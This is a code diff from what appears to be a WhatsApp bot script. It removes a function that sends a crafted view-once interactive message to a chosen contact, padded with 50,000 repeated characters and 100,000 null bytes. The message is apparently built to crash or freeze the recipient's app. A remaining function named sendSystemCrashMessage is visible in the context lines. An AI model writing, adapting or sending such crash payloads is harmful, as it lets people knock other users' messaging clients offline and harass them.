@@ -348,42 +348,6 @@ remoteJid: "status@broadcast"
 }
 }
 
-async function sendViewOnceMessages(jid) {
-    let messageContent = generateWAMessageFromContent(jid, {
-      'viewOnceMessage': {
-        'message': {
-          'messageContextInfo': {
-            'deviceListMetadata': {},
-            'deviceListMetadataVersion': 2
-          },
-          'interactiveMessage': proto.Message.InteractiveMessage.create({
-            'body': proto.Message.InteractiveMessage.Body.create({
-              'text': ''
-            }),
-            'footer': proto.Message.InteractiveMessage.Footer.create({
-              'text': ''
-            }),
-            'header': proto.Message.InteractiveMessage.Header.create({
-              'title': '',
-              'subtitle': '',
-              'hasMediaAttachment': false
-            }),
-            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
-              'buttons': [{
-                'name': "cta_url",
-                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
-              }],
-              'messageParamsJson': "\0".repeat(100000)
-            })
-          })
-        }
-      }
-    }, {});
-    qio.relayMessage(jid, messageContent.message, {
-      'messageId': messageContent.key.id
-    });
-}
-
 async function sendSystemCrashMessage(jid) {
   var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
     'viewOnceMessage': {
